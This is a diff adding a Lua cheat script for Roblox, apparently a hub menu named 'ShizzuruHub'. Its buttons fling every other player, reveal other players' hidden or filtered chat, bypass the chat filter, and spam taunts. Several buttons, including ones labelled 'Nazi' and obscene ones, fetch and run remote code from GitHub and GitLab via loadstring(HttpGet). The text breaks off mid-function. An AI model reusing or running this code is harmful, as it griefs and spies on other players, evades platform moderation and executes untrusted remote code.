@@ -1,0 +1,3989 @@
+local _, library = pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/Atlasv1/Atlasv1/main/lib")))
+
+local window = library:CreateWindow("ShizzuruHub")
+
+game.StarterGui:SetCore("SendNotification", {Title = "ShizzuruHub", Text = "Dev/Shizzuru", Icon = "rbxassetid://13968110951", Duration = 10, Button1 = "runn"})
+
+local function notify(a,b,c)
+    game.StarterGui:SetCore("SendNotification",{
+        Title = a;
+        Text = b;
+        Duration = c;
+    })
+end
+
+local state = window:GetCurrentState()
+
+if state == library.WindowState.Destroyed then
+    print("Window closed")
+end
+local tab = window:CreateTab("Ragdoll/engine")
+
+local toggle = tab:CreateToggle("Anti-Ragdoll", false, function (value)
+   if state then 
+if  game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity") then
+                local stop = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart)
+                stop.MaxForce = Vector3.new(0,0,0)
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("Falling down") then
+                local Fallingdown = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Falling down")
+                Fallingdown.Disabled = true
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("Pushed") then
+                local Pushed = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Pushed")
+                Pushed.Disabled = true
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("RagdollMe") then
+                local RagdollMe = game:GetService("Players").LocalPlayer.Character:FindFirstChild("RagdollMe")
+                RagdollMe.Disabled = true 
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("Swimming") then
+                local Swimming = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Swimming")
+                Swimming.Disabled = true
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("KillSript") then
+                local KillScript = game:GetService("Players").LocalPlayer.Character:FindFirstChild("KillScript")
+                KillScript.Disabled = true
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("StartRagdoll") then
+                local StartRagdoll = game:GetService("Players").LocalPlayer.Character:FindFirstChild("StartRagdoll")
+                StartRagdoll.Disabled = true
+            end
+        end
+elseif not state then
+ if  game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity") then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.BodyVelocity:Remove()
+            end     
+            if game.Players.LocalPlayer.Character:FindFirstChild("Falling down") then
+                local Fallingdown = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Falling down")
+                Fallingdown.Disabled = false
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("Pushed") then
+                local Pushed = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Pushed")
+                Pushed.Disabled = false
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("RagdollMe") then
+                local RagdollMe = game:GetService("Players").LocalPlayer.Character:FindFirstChild("RagdollMe")
+                RagdollMe.Disabled = false 
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("Swimming") then
+                local Swimming = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Swimming")
+                Swimming.Disabled = false
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("KillSript") then
+                local KillScript = game:GetService("Players").LocalPlayer.Character:FindFirstChild("KillScript")
+                KillScript.Disabled = false
+            end
+            if game.Players.LocalPlayer.Character:FindFirstChild("StartRagdoll") then
+                local StartRagdoll = game:GetService("Players").LocalPlayer.Character:FindFirstChild("StartRagdoll")
+                StartRagdoll.Disabled = false
+end
+end
+end)
+
+local toggle = tab:CreateToggle("Touch-fling", false, function (value)
+getgenv().demisethebest = value
+
+game:GetService("RunService").heartbeat:Connect(function()
+    if getgenv().demisethebest == true then 
+    local abc = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(6,6,6) * (10^25)
+    game:GetService("RunService").RenderStepped:Wait()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = abc
+    end 
+end)
+end)
+
+local button = tab:CreateButton("Fake/lag", function()
+    Uptime = .1
+Downtime = .5
+
+        PLR = game.Players.LocalPlayer.Character.HumanoidRootPart
+        _G.Toggle = true
+        
+        while _G.Toggle do
+            task.wait()
+            PLR.Anchored = true
+            wait(Downtime)
+            PLR.Anchored = false
+            wait(Uptime)
+end
+end)
+
+local button = tab:CreateButton("No/Fake/lag", function()
+    Uptime = .1
+Downtime = .5
+
+        PLR = game.Players.LocalPlayer.Character.HumanoidRootPart
+        _G.Toggle = false
+        
+        while _G.Toggle do
+            task.wait()
+            PLR.Anchored = true
+            wait(Downtime)
+            PLR.Anchored = false
+            wait(Uptime)
+end
+end)
+
+local button = tab:CreateButton("Antifling", function()
+   local RunService = game:GetService("RunService")
+local players = game:GetService("Players")
+local plr = players.LocalPlayer
+
+RunService.Stepped:Connect(function()
+    for i, CoPlayer in pairs(players:GetChildren()) do
+        if CoPlayer ~= plr and CoPlayer.Character then
+            for i,part in pairs(CoPlayer.Character:GetChildren()) do
+                if part:IsA("BasePart") or part:IsA("Part") or part.Name == "HumanoidRootPart" then
+                    part.CanCollide = false
+                elseif part:IsA("Accessory") and part:FindFirstChildOfClass("MeshPart") then
+                    part:FindFirstChildOfClass("MeshPart").CanCollide = false
+                end
+            end
+        end
+    end
+end)
+end)
+
+local button = tab:CreateButton("Potion/D!ck", function()
+    toolf = game.Players.LocalPlayer.Backpack:WaitForChild("potion")
+    toolf.Parent = game.Players.LocalPlayer.Character
+    game.Players.LocalPlayer.Character:WaitForChild("potion").Grip = CFrame.new(-1.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
+    game.Players.LocalPlayer.Character:WaitForChild("potion").GripForward = Vector3.new(1, -1.1, -0)
+    game.Players.LocalPlayer.Character:WaitForChild("potion").GripPos = Vector3.new(1.111100, 0.5, 1.5111)
+    game.Players.LocalPlayer.Character:WaitForChild("potion").GripUp = Vector3.new(-30000, 1000, 5000000)
+    end)
+
+local button = tab:CreateButton("Potion/fling", function()
+   if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+        local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+        local tool = game.Players.LocalPlayer.Character:FindFirstChild("potion")
+        humanoid:EquipTool(tool)
+        if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Cap") then
+                game.Players.LocalPlayer.Character.potion.Cap:Remove()
+            end
+        end
+        if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Script") then 
+                game.Players.LocalPlayer.Character.potion.Script:Remove()
+            end     
+        end
+        if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+            if game.Players.LocalPlayer.Character:FindFirstChild("InSide") then
+                game.Players.LocalPlayer.Character.potion.InSide:Remove()
+                Clipped = true
+                function Noclip()
+                    Clipped = false
+                    function Noclipped()
+                        if Clip == false and game:GetService("Players").LocalPlayer.Character ~= nil then
+                            for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+                                if child:IsA("BasePart") and child.CanCollide == true then
+                                    child.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                    Noclipping = game:GetService('RunService').Stepped:connect(Noclipped)
+                end
+
+
+                local tool = game:GetService("Players").LocalPlayer.Character:WaitForChild("potion")
+
+                if tool then
+                    tool.Parent = game:GetService("Players").LocalPlayer.Character
+                    tool.Handle.Massless = true
+                    RestoreCFling = {
+                        Grip = tool.GripPos;
+                    }
+                    tool.GripPos = Vector3.new(5000, 5000, 5000)
+                    Noclip()
+                    Noclipping:Disconnect()
+                    local Player = game:service('Players').LocalPlayer
+                    Player.Character['potion'].Parent = Player.Character
+                end
+            end
+            local humanoid = game.Players.LocalPlayer.Character.Humanoid
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Cap") then
+                game.Players.LocalPlayer.Character.potion.Cap:Remove()
+            end
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Script") then 
+                game.Players.LocalPlayer.Character.potion.Script:Remove()       
+            end
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("InSide") then
+                game.Players.LocalPlayer.Character.potion.InSide:Remove()
+                Clipped = true
+                function Noclip()
+                    Clipped = false
+                    function Noclipped()
+                        if Clip == false and game:GetService("Players").LocalPlayer.Character ~= nil then
+                            for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+                                if child:IsA("BasePart") and child.CanCollide == true then
+                                    child.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                    Noclipping = game:GetService('RunService').Stepped:connect(Noclipped)
+                end
+
+
+                local tool = game:GetService("Players").LocalPlayer.Character:WaitForChild("potion")
+
+                if tool then
+                    tool.Parent = game:GetService("Players").LocalPlayer.Character
+                    tool.Handle.Massless = true
+                    RestoreCFling = {
+                        Grip = tool.GripPos;
+                    }
+                    tool.GripPos = Vector3.new(5000, 5000, 5000)
+                    wait()
+                    Noclip()
+                    wait()
+                    Noclipping:Disconnect()
+                end
+            end
+        end
+    end
+    local humanoid = game.Players.LocalPlayer.Character.Humanoid
+    if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+        local tool = game.Players.LocalPlayer.Character.potion 
+        humanoid:EquipTool(tool)
+    end
+    if game.Players.LocalPlayer.Backpack:FindFirstChild("potion") then
+        local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+        local tool = game.Players.LocalPlayer.Backpack:FindFirstChild("potion")
+        humanoid:EquipTool(tool)
+        if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Cap") then
+                game.Players.LocalPlayer.Character.potion.Cap:Remove()
+            end
+        end
+        if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Script") then 
+                game.Players.LocalPlayer.Character.potion.Script:Remove()
+            end     
+        end
+        if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
+            if game.Players.LocalPlayer.Character:FindFirstChild("InSide") then
+                game.Players.LocalPlayer.Character.potion.InSide:Remove()
+                Clipped = true
+                function Noclip()
+                    Clipped = false
+                    function Noclipped()
+                        if Clip == false and game:GetService("Players").LocalPlayer.Character ~= nil then
+                            for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+                                if child:IsA("BasePart") and child.CanCollide == true then
+                                    child.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                    Noclipping = game:GetService('RunService').Stepped:connect(Noclipped)
+                end
+
+
+                local tool = game:GetService("Players").LocalPlayer.Character:WaitForChild("potion")
+
+                if tool then
+                    tool.Parent = game:GetService("Players").LocalPlayer.Backpack
+                    tool.Handle.Massless = true
+                    RestoreCFling = {
+                        Grip = tool.GripPos;
+                    }
+                    tool.GripPos = Vector3.new(5000, 5000, 5000)
+                    Noclip()
+                    Noclipping:Disconnect()
+                    local Player = game:service('Players').LocalPlayer
+                    Player.Backpack['potion'].Parent = Player.Character
+                end
+            end
+            local humanoid = game.Players.LocalPlayer.Character.Humanoid
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Cap") then
+                game.Players.LocalPlayer.Character.potion.Cap:Remove()
+            end
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("Script") then 
+                game.Players.LocalPlayer.Character.potion.Script:Remove()       
+            end
+            if game.Players.LocalPlayer.Character.potion:FindFirstChild("InSide") then
+                game.Players.LocalPlayer.Character.potion.InSide:Remove()
+                Clipped = true
+                function Noclip()
+                    Clipped = false
+                    function Noclipped()
+                        if Clip == false and game:GetService("Players").LocalPlayer.Character ~= nil then
+                            for _, child in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
+                                if child:IsA("BasePart") and child.CanCollide == true then
+                                    child.CanCollide = false
+                                end
+                            end
+                        end
+                    end
+                    Noclipping = game:GetService('RunService').Stepped:connect(Noclipped)
+                end
+
+
+                local tool = game:GetService("Players").LocalPlayer.Character:WaitForChild("potion")
+
+                if tool then
+                    tool.Parent = game:GetService("Players").LocalPlayer.Backpack
+                    tool.Handle.Massless = true
+                    RestoreCFling = {
+                        Grip = tool.GripPos;
+                    }
+                    tool.GripPos = Vector3.new(5000, 5000, 5000)
+                    wait()
+                    Noclip()
+                    wait()
+                    Noclipping:Disconnect()
+                end
+            end
+        end
+    end
+    local humanoid = game.Players.LocalPlayer.Character.Humanoid
+    if game.Players.LocalPlayer.Backpack:FindFirstChild("potion") then
+        local tool = game.Players.LocalPlayer.Backpack.potion 
+        humanoid:EquipTool(tool)
+    end 
+	end)
+    
+local tab = window:CreateTab("Misc")
+
+local button = tab:CreateButton("FE Flips[z,x,c]", function()
+   -- Copy from where it says wait(5) this is not my script so I will not take script credits
+ 
+-- Discord server coming soon
+ 
+wait(5)
+ 
+--[[ Info ]]--
+ 
+local ver = "2.00"
+local scriptname = "feFlip"
+ 
+ 
+--[[ Keybinds ]]--
+ 
+local FrontflipKey = Enum.KeyCode.Z
+local BackflipKey = Enum.KeyCode.X
+local AirjumpKey = Enum.KeyCode.C
+ 
+ 
+--[[ Dependencies ]]--
+ 
+local ca = game:GetService("ContextActionService")
+local zeezy = game:GetService("Players").LocalPlayer
+local h = 0.0174533
+local antigrav
+ 
+ 
+--[[ Functions ]]--
+ 
+function zeezyFrontflip(act,inp,obj)
+	if inp == Enum.UserInputState.Begin then
+		zeezy.Character.Humanoid:ChangeState("Jumping")
+		wait()
+		zeezy.Character.Humanoid.Sit = true
+		for i = 1,360 do 
+			delay(i/720,function()
+			zeezy.Character.Humanoid.Sit = true
+				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(-h,0,0)
+			end)
+		end
+		wait(0.55)
+		zeezy.Character.Humanoid.Sit = false
+	end
+end
+ 
+function zeezyBackflip(act,inp,obj)
+	if inp == Enum.UserInputState.Begin then
+		zeezy.Character.Humanoid:ChangeState("Jumping")
+		wait()
+		zeezy.Character.Humanoid.Sit = true
+		for i = 1,360 do
+			delay(i/720,function()
+			zeezy.Character.Humanoid.Sit = true
+				zeezy.Character.HumanoidRootPart.CFrame = zeezy.Character.HumanoidRootPart.CFrame * CFrame.Angles(h,0,0)
+			end)
+		end
+		wait(0.55)
+		zeezy.Character.Humanoid.Sit = false
+	end
+end
+ 
+function zeezyAirjump(act,inp,obj)
+	if inp == Enum.UserInputState.Begin then
+		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Seated")
+		wait()
+		zeezy.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")	
+	end
+end
+ 
+ 
+--[[ Binds ]]--
+ 
+ca:BindAction("zeezyFrontflip",zeezyFrontflip,false,FrontflipKey)
+ca:BindAction("zeezyBackflip",zeezyBackflip,false,BackflipKey)
+ca:BindAction("zeezyAirjump",zeezyAirjump,false,AirjumpKey)
+end)
+
+local button = tab:CreateButton("Fling All", function()
+    local Targets = {"All"} -- "All", "Target Name", "arian_was_here"
+
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+
+local AllBool = false
+
+local GetPlayer = function(Name)
+    Name = Name:lower()
+    if Name == "all" or Name == "others" then
+        AllBool = true
+        return
+    elseif Name == "random" then
+        local GetPlayers = Players:GetPlayers()
+        if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+        return GetPlayers[math.random(#GetPlayers)]
+    elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+        for _,x in next, Players:GetPlayers() do
+            if x ~= Player then
+                if x.Name:lower():match("^"..Name) then
+                    return x;
+                elseif x.DisplayName:lower():match("^"..Name) then
+                    return x;
+                end
+            end
+        end
+    else
+        return
+    end
+end
+
+local Message = function(_Title, _Text, Time)
+    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
+end
+
+local SkidFling = function(TargetPlayer)
+    local Character = Player.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+
+    local TCharacter = TargetPlayer.Character
+    local THumanoid
+    local TRootPart
+    local THead
+    local Accessory
+    local Handle
+
+    if TCharacter:FindFirstChildOfClass("Humanoid") then
+        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+    end
+    if THumanoid and THumanoid.RootPart then
+        TRootPart = THumanoid.RootPart
+    end
+    if TCharacter:FindFirstChild("Head") then
+        THead = TCharacter.Head
+    end
+    if TCharacter:FindFirstChildOfClass("Accessory") then
+        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+    end
+    if Accessoy and Accessory:FindFirstChild("Handle") then
+        Handle = Accessory.Handle
+    end
+
+    if Character and Humanoid and RootPart then
+        if RootPart.Velocity.Magnitude < 50 then
+            getgenv().OldPos = RootPart.CFrame
+        end
+        if THumanoid and THumanoid.Sit and not AllBool then
+            return Message("Error Occurred", "Targeting is sitting", 5) -- u can remove dis part if u want lol
+        end
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif not THead and Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        elseif THumanoid and TRootPart then
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+            return
+        end
+        
+        local FPos = function(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+        
+        local SFBasePart = function(BasePart)
+            local TimeToWait = 2
+            local Time = tick()
+            local Angle = 0
+
+            repeat
+                if RootPart and THumanoid then
+                    if BasePart.Velocity.Magnitude < 50 then
+                        Angle = Angle + 100
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+                    else
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+                        
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+                    end
+                else
+                    break
+                end
+            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+        end
+        
+        workspace.FallenPartsDestroyHeight = 0/0
+        
+        local BV = Instance.new("BodyVelocity")
+        BV.Name = "EpixVel"
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+        
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        
+        if TRootPart and THead then
+            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                SFBasePart(THead)
+            else
+                SFBasePart(TRootPart)
+            end
+        elseif TRootPart and not THead then
+            SFBasePart(TRootPart)
+        elseif not TRootPart and THead then
+            SFBasePart(THead)
+        elseif not TRootPart and not THead and Accessory and Handle then
+            SFBasePart(Handle)
+        else
+            return Message("Error Occurred", "Target is missing everything", 5)
+        end
+        
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+        
+        repeat
+            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+            Humanoid:ChangeState("GettingUp")
+            table.foreach(Character:GetChildren(), function(_, x)
+                if x:IsA("BasePart") then
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                end
+            end)
+            task.wait()
+        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+        workspace.FallenPartsDestroyHeight = getgenv().FPDH
+    else
+        return Message("Error Occurred", "Random error", 5)
+    end
+end
+
+if not Welcome then Message("Script by Shizuu", "enjoy!", 5) end
+getgenv().Welcome = true
+if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+
+if AllBool then
+    for _,x in next, Players:GetPlayers() do
+        SkidFling(x)
+    end
+end
+
+for _,x in next, Targets do
+    if GetPlayer(x) and GetPlayer(x) ~= Player then
+        if GetPlayer(x).UserId ~= 1414978355 then
+            local TPlayer = GetPlayer(x)
+            if TPlayer then
+                SkidFling(TPlayer)
+            end
+        else
+            Message("Error Occurred", "This user is whitelisted! (Owner)", 5)
+        end
+    elseif not GetPlayer(x) and not AllBool then
+        Message("Error Occurred", "Username Invalid", 5)
+    end
+end
+end)
+
+local button = tab:CreateButton("ChatSpy", function()
+    --[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+--This script reveals ALL hidden messages in the default chat
+--chat "/spy" to toggle!
+enabled = true
+--if true will check your messages too
+spyOnMyself = true
+--if true will chat the logs publicly (fun, risky)
+public = false
+--if true will use /me to stand out
+publicItalics = true
+--customize private logs
+privateProperties = {
+    Color = Color3.fromRGB(142, 68, 173); 
+    Font = Enum.Font.RobotoMono;
+    TextSize = 16;
+}
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+local instance = (_G.chatSpyInstance or 0) + 1
+_G.chatSpyInstance = instance
+ 
+local function onChatted(p,msg)
+    if _G.chatSpyInstance == instance then
+        if p==player and msg:lower():sub(1,4)=="/spy" then
+            enabled = not enabled
+            wait(0.3)
+            privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+            StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+        elseif enabled and (spyOnMyself==true or p~=player) then
+            msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+            local hidden = true
+            local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
+                if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
+                    hidden = false
+                end
+            end)
+            wait(1)
+            conn:Disconnect()
+            if hidden and enabled then
+                if public then
+                    saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.DisplayName .."]: "..msg,"All")
+                else
+                    privateProperties.Text = "{ggx} [".. p.DisplayName .."]: "..msg
+                    StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+                end
+            end
+        end
+    end
+end
+ 
+for _,p in ipairs(Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end
+Players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(msg) onChatted(p,msg) end)
+end)
+privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
+StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
+local chatFrame = player.PlayerGui.Chat.Frame
+chatFrame.ChatChannelParentFrame.Visible = true
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
+end)
+
+local button = tab:CreateButton("ClickTP", function()
+    mouse = game.Players.LocalPlayer:GetMouse()
+tool = Instance.new("Tool")
+tool.RequiresHandle = false
+tool.Name = "Click Teleport"
+tool.Activated:connect(function()
+local pos = mouse.Hit+Vector3.new(0,2.5,0)
+pos = CFrame.new(pos.X,pos.Y,pos.Z)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+end)
+tool.Parent = game.Players.LocalPlayer.Backpack
+end)
+
+local button = tab:CreateButton("Trash/Talk", function()
+    function dowait()
+			wait(0.172)
+		end
+		local tbl_main = 
+		{
+			  "EZZZZZZZZZZ" , 
+			  "All"
+		}
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+		dowait()
+		local tbl_main = 
+		{
+			  "ShizzuruHub" , 
+			  "All"
+		}
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+		dowait()
+		local tbl_main = 
+		{
+			  "wins." , 
+			  "All"
+		}
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+		dowait()
+		local tbl_main = 
+		{
+			  "Clip?" , 
+			  "All"
+		}
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+		dowait()
+		local tbl_main = 
+		{
+			  "Shizuru is win" , 
+			  "All"
+		}
+		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+	end)
+
+local button = tab:CreateButton("Freeze/gui", function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/Atlasv1/Atlasv1/main/freeze.player"))()
+    end)
+
+local button = tab:CreateButton("Bypass/Chat", function()
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/bypass%20chat.lua"))()
+    end)
+
+local button = tab:CreateButton("Unlock/Zoom", function()
+    if state then
+    game.Players.LocalPlayer.CameraMaxZoomDistance = (999999999999999)
+    elseif not state then
+    game.Players.LocalPlayer.CameraMaxZoomDistance = (400)
+    end
+    end)
+
+local button = tab:CreateButton("Anti/AFK", function()
+    local notifSound = Instance.new("Sound",workspace)
+        notifSound.PlaybackSpeed = 1
+        notifSound.Volume = 0.30
+        notifSound.SoundId = "rbxassetid://5568992074"
+        notifSound.PlayOnRemove = true
+        notifSound:Destroy()
+        local vu = game:GetService("VirtualUser")
+        game:GetService("Players").LocalPlayer.Idled:connect(function()
+        vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+        wait(1)
+        vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+        end)
+    end)
+
+
+local tab = window:CreateTab("Fun/Scripts")
+
+local button = tab:CreateButton("Dick", function()
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/cocl_pic.lua"))()
+    end)
+
+local button = tab:CreateButton("Nazi", function()
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/naz.lua"))()
+    end)
+
+local button = tab:CreateButton("Sh!t", function()
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/shit_pic.lua"))()
+    end)
+
+local button = tab:CreateButton("Russ", function()
+    loadstring(game:HttpGet("https://gitlab.com/ivanovpogorely/2323313frrf/-/raw/main/rusia.lua"))()
+    end)
+
+local button = tab:CreateButton("Moon", function()
+    local notifSound = Instance.new("Sound",workspace)
+        notifSound.PlaybackSpeed = 1
+        notifSound.Volume = 0.30
+        notifSound.SoundId = "rbxassetid://5568992074"
+        notifSound.PlayOnRemove = true
+        notifSound:Destroy()
+        local baseplate = Instance.new("Part")
